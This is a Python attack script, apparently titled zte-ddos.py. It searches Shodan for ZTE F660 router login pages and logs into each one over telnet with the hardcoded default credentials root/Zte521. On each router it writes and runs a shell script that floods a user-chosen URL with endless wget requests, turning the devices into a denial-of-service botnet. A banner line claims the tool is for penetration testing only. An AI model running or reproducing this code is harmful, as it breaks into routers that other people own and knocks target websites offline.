#!/usr/bin/python

import string
import mechanize
import socket
import Queue
import threading
import time
import sys

def scrap_ip(param):
	br = mechanize.Browser()
	br.set_handle_robots(False)
	br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36')]
	respone = br.open("https://www.shodan.io/search?query="+param)
	ip = []
	for link in br.links():
		link_ip = link.text
		tmp = link_ip.split(".")
		if (tmp[0].isdigit() and tmp[1].isdigit() and tmp[2].isdigit() and tmp[3].isdigit()):
				tmp = tmp[0]+'.'+tmp[1]+'.'+tmp[2]+'.'+tmp[3]
				ip.append(tmp)
	return ip

def run(ip, target):
	try:
		serv = socket.socket()
		print "Attack on --> "+ip
		serv.connect((ip, 23))
		# print serv.recv(1024)
		serv.sendall("root\n")
		# print serv.recv(1024)
		serv.sendall("Zte521\n")
		# print serv.recv(1024)
		serv.sendall("cd tmp\n")
		# print serv.recv(1024)
		serv.sendall("echo 'while true; do  (wget -qO/dev/null  "+target+" &) > /dev/null;  done' >> dukun_cyber.sh \n")
		# print serv.recv(1024)
		serv.sendall("sh dukun_cyber.sh &\n")
		while True:
			serv.recv(1024)
	except:
		pass
	

def banner():
	print """ 
	 __________ _____   ____  ____   ___  ____  
	|__  /_   _| ____| |  _ \|  _ \ / _ \/ ___| 
	  / /  | | |  _|   | | | | | | | | | \___ \ 
	 / /_  | | | |___  | |_| | |_| | |_| |___) |
	/____| |_| |_____| |____/|____/ \___/|____/ 
                                            
		Code Name ---> pendekar_langit.
		Please use Penetration testing don't
		use for attacking.
		Please install mechanize lib first.
			sudo pip install mechanize
		Blog : http://learningbasicnetwork.blogspot.com.
		Github : https://github.com/suryadana.
		Target ex: http://example.com/anu.png.
		Help : python zte-ddos.py help
                  """
def help_use():
	print "Uses : python zte-ddos.py http://example.com/anu.png\n"
	
def main():
	banner()
	if len(sys.argv) == 1:
		help_use()
	else:
		if sys.argv[1] != "help":
			while True:
				print "\nNew Target"
				ips = scrap_ip("F660 Login:")
				for ip in ips:
					t = threading.Thread(target=run, args=(ip, sys.argv[1],))
					t.daemon = True
					t.start()
				time.sleep(120)
		else:
			help_use()

if __name__ == '__main__':
	main()